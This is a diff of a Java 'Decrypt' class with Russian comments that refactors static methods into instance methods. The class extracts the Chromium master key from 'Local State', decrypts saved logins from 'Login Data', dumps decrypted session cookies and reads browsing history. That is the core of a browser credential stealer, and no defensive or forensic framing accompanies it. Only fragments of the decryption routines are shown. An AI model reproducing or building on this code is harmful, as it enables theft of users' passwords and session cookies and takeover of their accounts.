@@ -20,7 +20,7 @@ import java.util.regex.Pattern;
  */
 public class Decrypt {
 
-    private static String dbConnection = "jdbc:sqlite:";
+    private String dbConnection = "jdbc:sqlite:";
 
     /**
      * Получает мастер-ключ для расшифровки данных.
@@ -29,7 +29,7 @@ public class Decrypt {
      * @return массив байтов с мастер-ключом
      * @throws Exception если происходит ошибка при получении мастер-ключа
      */
-    public static byte[] getMasterKey(String directory) throws Exception {
+    public byte[] getMasterKey(String directory) throws Exception {
         Path localStateFile = Path.of(directory + "/Local State");
         String localState = Files.readString(localStateFile, StandardCharsets.UTF_8);
         String masterKeyB64 = "";
@@ -53,7 +53,7 @@ public class Decrypt {
      * @return расшифрованный пароль
      * @throws Exception если происходит ошибка при расшифровке пароля
      */
-    public static String decryptPassword(byte[] passwordBytes, byte[] masterKey) throws Exception {
+    public String decryptPassword(byte[] passwordBytes, byte[] masterKey) throws Exception {
         byte[] iv = Arrays.copyOfRange(passwordBytes, 3, IV_LENGTH + 3);
         byte[] ciphertext = Arrays.copyOfRange(passwordBytes, IV_LENGTH + 3, passwordBytes.length);
 
@@ -74,7 +74,7 @@ public class Decrypt {
      * @return расшифрованные пароли в виде строки
      * @throws Exception если происходит ошибка при расшифровке паролей
      */
-    public static String decryptPasswords(String directory) throws Exception {
+    public String decryptPasswords(String directory) throws Exception {
         StringBuilder textBuilder = new StringBuilder("URL | LOGIN | PASSWORD\n");
 
         File dbFile = new File(directory + "/Login Data");
@@ -107,7 +107,7 @@ public class Decrypt {
      * @return информация о cookies в виде строки
      * @throws Exception если происходит ошибка при извлечении информации о cookies
      */
-    public static String extractCookies(String directory) throws Exception {
+    public String extractCookies(String directory) throws Exception {
         byte[] key = getMasterKey(directory);
         StringBuilder textBuilder = new StringBuilder();
         File dbFile = new File(directory + "/Cookies");
@@ -134,9 +134,9 @@ public class Decrypt {
                 textBuilder.append("Host: ").append(hostKey)
                         .append("\nCookie name: ").append(name)
                         .append("\nCookie value (decrypted): ").append(decryptedValue)
-                        .append("\nCreation datetime (UTC): ").append(getDatetime(creationUtc))
-                        .append("\nLast access datetime (UTC): ").append(getDatetime(lastAccessUtc))
-                        .append("\nExpires datetime (UTC): ").append(getDatetime(expiresUtc))
+                        .append("\nCreation datetime (UTC): ").append(getDateTime(creationUtc))
+                        .append("\nLast access datetime (UTC): ").append(getDateTime(lastAccessUtc))
+                        .append("\nExpires datetime (UTC): ").append(getDateTime(expiresUtc))
                         .append("\n===============================================================\n");
             }
 
@@ -153,7 +153,7 @@ public class Decrypt {
      * @param historyPath путь к файлу истории
      * @return история посещений в виде строки
      */
-    public static String getHistory(String historyPath) {
+    public String getHistory(String historyPath) {
         StringBuilder textBuilder = new StringBuilder("\n");
 
         File dbFile = new File(historyPath);
@@ -190,7 +190,7 @@ public class Decrypt {
      * @param utcTimestamp UTC-временная метка
      * @return строка даты и времени
      */
-    private static String getDatetime(long utcTimestamp) {
+    private String getDateTime(long utcTimestamp) {
         LocalDateTime epochDateTime = LocalDateTime.of(1601, 1, 1, 0, 0, 0);
         LocalDateTime dateTime = epochDateTime.plusSeconds(utcTimestamp / 1000000);
         DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
